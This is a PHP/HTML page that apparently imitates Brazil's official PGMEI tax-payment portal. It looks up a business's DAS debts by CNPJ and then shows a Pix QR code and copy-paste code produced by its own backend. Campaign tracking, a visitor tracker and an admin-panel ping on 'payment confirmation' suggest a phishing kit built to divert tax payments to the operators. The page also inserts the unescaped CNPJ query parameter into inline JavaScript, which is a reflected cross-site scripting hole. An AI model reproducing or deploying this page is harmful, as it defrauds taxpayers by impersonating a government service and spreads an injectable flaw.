<?php
// pages/pgmei/consulta.php
if (!isset($pdo)) {
    require_once "../../db.php";
    require_once "../../base/utility.php";
    require_once "../../base/detect_device.php";
}

$cnpj = $_GET['cnpj'] ?? $_GET['doc'] ?? '';
if (empty($cnpj)) {
    header("Location: index.php");
    exit;
}

$id_usuario = (int)($_COOKIE['campanha'] ?? $_SESSION['user_id'] ?? 1); 
$page = 'pgmei';
require_once __DIR__ . "/../../base/tracker.php";

// Se não vier do index.php principal, $diretorio não estará setado
$pathBase = isset($diretorio) ? "./{$diretorio}/" : "./";
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <meta http-equiv="content-language" content="pt-br">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no">
    <link rel="icon" type="image/x-icon" href="<?= $pathBase ?>PGMEI/favicon.ico">

    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>

    <link href="<?= $pathBase ?>PGMEI/pgmei.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>

    <style>
        #qrcodImg { width: 165px; }
        .payment-detail { background: #5cb85c; padding: 15px; color: white; margin-bottom: 10px; border-radius: 5px; }
        #copy, #paguei { 
            height: 29px; background-color: #f5821e; color: #fff; cursor: pointer; 
            outline: none; border: none; border-radius: 5px; font-weight: bolder; font-size: 16px; 
            box-sizing: border-box; font-family: Arial; padding: 0 10px; line-height: 29px;
        }
        .modal-footer { text-align: center; padding: 3px; display: flex; flex-direction: column; gap: 10px; color: black; }
        .modal-content { color: black; background-color: white; padding: 20px; border-radius: 8px; width: 80%; margin: 0 auto; max-width: 440px; font-family: Arial; margin-top: 40px; z-index: 999; }
        .close { float: right; font-size: 24px; cursor: pointer; color: #000000; }
        .modal-header { font-size: 20px; font-weight: bold; margin-bottom: 15px; color: black !important; }
        .in { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; }
        .paSelecionado { appearance: none; -webkit-appearance: none; width: 20px; height: 20px; border: 2px solid #555; border-radius: 6px; cursor: pointer; display: inline-block; position: relative; transition: 0.25s; }
        .paSelecionado:hover { border-color: #1e88e5; box-shadow: 0 0 6px rgba(30, 136, 229, 0.4); }
        .paSelecionado:checked { background-color: #1e88e5; border-color: #1e88e5; }
        .paSelecionado:checked::after { content: "✓"; color: white; font-size: 18px; position: absolute; left: 2px; top: -4px; font-weight: bold; }
        #loandig { display: none; justify-content: center; align-items: center; height: 100%; width: 100%; top: 0; position: fixed; z-index: 999999; background: #ffffff94; }
        .loading-box { display: flex; justify-content: center; width: 200px; border-radius: 3px; height: 89px; background: white; align-items: center; box-shadow: 0 9px 46px 8px rgba(0, 0, 0, 0.12); }
        .step-content { display: none; }
        .step-content.active { display: block; }
    </style>
</head>
<body>

    <div id="loandig">
        <div class="loading-box">
            <img src="<?= $pathBase ?>PGMEI/Spinner-btn.gif" style="width: 55px; margin-top: -8px;">
            <div>Consultando...</div>
        </div>
    </div>

    <div class="container-fluid">
        <header class="row">
            <h3><span class="label label-success"><img alt="Brand" src="<?= $pathBase ?>PGMEI/logo-simples.png"> PGMEI</span></h3>
            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
        </header>

        <section class="row">
            <nav class="navbar navbar-default" role="navigation">
                <div class="container-fluid bg-success" style="min-height: 48px;">
                    <div class="collapse navbar-collapse" id="navbarCollapse">
                        <ul class="nav navbar-nav">
                            <li><a href="index.php"><span class="glyphicon glyphicon-home"></span> Inicio</a></li>
                            <li class="active"><a href="#"><span class="glyphicon glyphicon-check"></span> Emitir Guia de Pagamento (DAS)</a></li>
                        </ul>
                        <ul class="nav navbar-nav navbar-right">
                            <li><a href="#"><span class="glyphicon glyphicon-info-sign"></span> Ajuda</a></li>
                            <li><a href="index.php"><span class="glyphicon glyphicon-log-out"></span> Sair</a></li>
                        </ul>
                    </div>
                </div>
            </nav>
        </section>

        <section class="row" role="contentinfo">
            <ul class="list-group">
                <li class="list-group-item">
                    <ul class="list-inline" style="margin-bottom: 0;">
                        <li><strong>CNPJ:</strong> <span id="display-cnpj"><?= htmlspecialchars($cnpj) ?></span></li>
                        <li><strong>Nome:</strong> <span id="display-nome">CARREGANDO...</span></li>
                    </ul>
                </li>
            </ul>
        </section>

        <section class="row">
            <div class="well col-md-12" role="main">
                
                <!-- STEP 1: Escolha do Ano -->
                <div id="step-ano" class="step-content active text-center">
                    <div class="AnoCalendario">
                        <form id="formAno" class="form-inline" role="form">
                            <div class="form-group">
                                <label for="anoCalendarioSelect">Informe o Ano-Calendário:</label>
                                <select name="ano" id="anoCalendarioSelect" class="form-control" style="width: 100px; display: inline-block;">
                                    <option value="2021">2021</option>
                                    <option value="2022">2022</option>
                                    <option value="2023">2023</option>
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026" selected>2026</option>
                                </select>
                            </div>
                            <button type="submit" class="btn btn-success">Ok</button>
                        </form>
                    </div>
                </div>

                <!-- STEP 2: Lista de Faturas -->
                <div id="step-resultados" class="step-content">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            <h4 class="panel-title">Selecione o(s) período(s) de apuração:</h4>
                        </div>
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-hover table-condensed emissao is-detailed">
                                    <thead>
                                        <tr>
                                            <th rowspan="2"></th>
                                            <th rowspan="2">Período de Apuração</th>
                                            <th rowspan="2">Apurado</th>
                                            <th rowspan="2" class="beneficio">Benefício INSS</th>
                                            <th rowspan="2">Situação</th>
                                            <th colspan="6" class="text-center">Resumo do DAS a ser gerado</th>
                                        </tr>
                                        <tr>
                                            <th>Principal</th>
                                            <th>Multa</th>
                                            <th>Juros</th>
                                            <th>Total</th>
                                            <th>Vencimento</th>
                                            <th>Acolhimento</th>
                                        </tr>
                                    </thead>
                                    <tbody id="faturas">
                                        <!-- Dinâmico -->
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="panel-footer">
                            <div class="row">
                                <div class="col-md-12 text-center">
                                    <label>Valor total a pagar:</label>
                                    <input type="text" class="form-control" id="dataPagamentoInformada" value="0,00" readonly style="width: 150px; display: inline-block; text-align: center; font-weight: bold; font-size: 18px; color: #3c763d;">
                                    <hr>
                                </div>
                            </div>
                            <div class="row text-center">
                                <button id="btnPagarPix" class="btn btn-success btn-lg" disabled>Pagar com Pix</button>
                                <button onclick="location.reload()" class="btn btn-default btn-lg">Voltar</button>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </section>

        <!-- Modal Pix (Baseado no layout antigo) -->
        <div id="basepix" style="display: none;">
            <div style="position: fixed; top: 0; width: 100%; margin: 0; left: 0; height: 100%; z-index: 122; display: flex; justify-content: center; align-items: center;">
                <div onclick="closeModal();" style="position: fixed; top: 0; width: 100%; margin: 0; left: 0; background: #00000075; height: 100%; z-index: 122;"></div>
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">×</span>
                    <div class="modal-header">Pagamento DAS MEI</div>
                    <div class="modal-body">
                        <div class="payment-detail">
                            <div>Valor: <span style="color:white; font-weight: bold;" id="modalValor">R$ 0,00</span></div>
                            <div>CNPJ: <span style="color:white;" id="modalCnpj"><?= htmlspecialchars($cnpj) ?></span></div>
                        </div>
                        <div style="margin: 15px 0;">Para efetuar o pagamento, escaneie o QRCODE abaixo:</div>
                        <center>
                            <img id="modalQRCode" src="<?= $pathBase ?>PGMEI/Spinner-btn.gif" style="width: 180px; border: 1px solid #eee; padding: 10px;">
                        </center>
                        <div style="margin: 15px 0;">Ou caso prefira, copie o código PIX abaixo:</div>
                        <input type="text" class="in" id="modalPixCode" readonly onclick="this.select()">
                    </div>
                    <div class="modal-footer">
                        <button onclick="copyPix()" id="copy">Copiar o código <i class="fa fa-clipboard"></i></button>
                        <button onclick="pagueiConf()" id="paguei" style="display: none; background-color: #0076BC;">Confirmar Pagamento <i class="fa fa-check"></i></button>
                    </div>
                </div>
            </div>
        </div>

        <footer class="row clearfix">
            <div class="pull-left">
                <p class="text-success"><strong>Versão: 3.14.1</strong></p>
            </div>
            <div class="pull-right">
                <img src="<?= $pathBase ?>PGMEI/marca_Simples_entes.png" alt="" style="height: 30px;">
            </div>
        </footer>
    </div>

    <script>
        let totalValue = 0;
        let currentRef = null;

        function showStep(stepId) {
            $('.step-content').removeClass('active');
            $('#step-' + stepId).addClass('active');
        }

        function toggleLoading(show) {
            if (show) $('#loandig').css('display', 'flex');
            else $('#loandig').hide();
        }

        function closeModal() {
            $('#basepix').hide();
        }

        // Form Ano
        $('#formAno').submit(function(e){
            e.preventDefault();
            const ano = $('#anoCalendarioSelect').val();
            const cnpj = '<?= $cnpj ?>';
            toggleLoading(true);
            $.getJSON('../../api/buscaPGMEI.php', { cnpj, ano }, function(data) {
                if (data.IsStatus) {
                    $('#display-nome').text(data.nome);
                    renderFaturas(data.dados);
                    showStep('resultados');
                } else {
                    toastr.error(data.error || 'Erro na consulta.');
                }
            }).always(() => toggleLoading(false));
        });

        function renderFaturas(dados) {
            const tbody = $('#faturas');
            tbody.empty();
            dados.forEach(item => {
                const tr = `
                    <tr class="pa">
                        <td class="text-center">
                            ${item.total_raw > 0 ? `<input type="checkbox" class="paSelecionado" data-valor="${item.total_raw}" onchange="updateTotal()">` : ''}
                        </td>
                        <td>${item.mes_referencia}</td>
                        <td class="text-center">${item.apurado}</td>
                        <td class="beneficio text-center"><input type="checkbox" disabled></td>
                        <td class="text-center" style="font-weight: bold; color: ${item.status === 'Liquidado' ? 'green' : (item.status === 'A Vencer' ? '#212121' : 'red')}">
                            ${item.status}
                        </td>
                        <td class="text-center">${item.principal}</td>
                        <td class="text-center">${item.multa}</td>
                        <td class="text-center">${item.juros}</td>
                        <td class="text-center" style="font-weight: bold;">${item.total === '0,00' ? '-' : 'R$ ' + item.total}</td>
                        <td class="text-center">${item.vencimento}</td>
                        <td class="text-center">${item.acolhimento || '-'}</td>
                    </tr>
                `;
                tbody.append(tr);
            });
            updateTotal();
        }

        function updateTotal() {
            totalValue = 0;
            $('.paSelecionado:checked').each(function(){
                const val = parseFloat($(this).attr('data-valor'));
                if (!isNaN(val)) {
                    totalValue += val;
                }
            });
            $('#dataPagamentoInformada').val('R$ ' + totalValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
            $('#btnPagarPix').prop('disabled', totalValue <= 0);
        }

        $('#btnPagarPix').click(function(){
            const cnpj = '<?= $cnpj ?>';
            const nome = $('#display-nome').text();
            const totalDebitos = $('.paSelecionado').length;
            const debitosSelecionados = $('.paSelecionado:checked').length;
            const debitoResumo = `${debitosSelecionados}/${totalDebitos}`;
            toggleLoading(true);
            
            const formData = new FormData();
            formData.append('cpf_cnpj', cnpj);
            formData.append('nome', nome);
            formData.append('valor', totalValue.toFixed(2));
            formData.append('debito', debitoResumo);

            fetch('../../data/pix.php', { method: 'POST', body: formData })
            .then(res => res.json())
            .then(data => {
                if (data.status && data.pix) {
                    currentRef = data.id || data.pix;
                    $('#modalValor').text('R$ ' + totalValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
                    $('#modalPixCode').val(data.pix);
                    
                    const pixCode = data.pix.trim();
                    const qrUrl = "https://chart.googleapis.com/chart?chs=300x300&cht=qr&chld=L|1&chl=" + encodeURIComponent(pixCode);
                    const qrFallback = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(pixCode);
                    
                    $('#modalQRCode').attr('src', qrUrl).attr('onerror', `this.src='${qrFallback}'`);
                    
                    $('#basepix').show();

                    // Mostrar botão "Confirmar Pagamento" após 10 segundos
                    $('#paguei').hide();
                    setTimeout(() => {
                        $('#paguei').fadeIn();
                    }, 10000); 

                } else {
                    toastr.error('Erro ao gerar Pix.');
                }
            })
            .finally(() => toggleLoading(false));
        });

        function copyPix() {
            const copyText = document.getElementById("modalPixCode");
            copyText.select();
            document.execCommand("copy");
            toastr.success("Código PIX Copiado!");
        }

        function pagueiConf() {
            if (!currentRef) return;
            
            $('#paguei').prop('disabled', true).text('Processando solicitação...');
            
            // Dispara notificação para o painel administrativo
            fetch('../../api/typing_start.php?action=confirm_payment&ref=' + encodeURIComponent(currentRef))
            .then(() => {
                alert("Sua solicitação de baixa foi enviada. O sistema processará o comprovante e atualizará seu status em alguns instantes.");
                closeModal();
            })
            .catch(() => {
                alert("Ocorreu uma instabilidade na conexão. Por favor, tente confirmar novamente.");
                $('#paguei').prop('disabled', false).html('Confirmar Pagamento <i class="fa fa-check"></i>');
            });
        }
    </script>

</body>
</html>
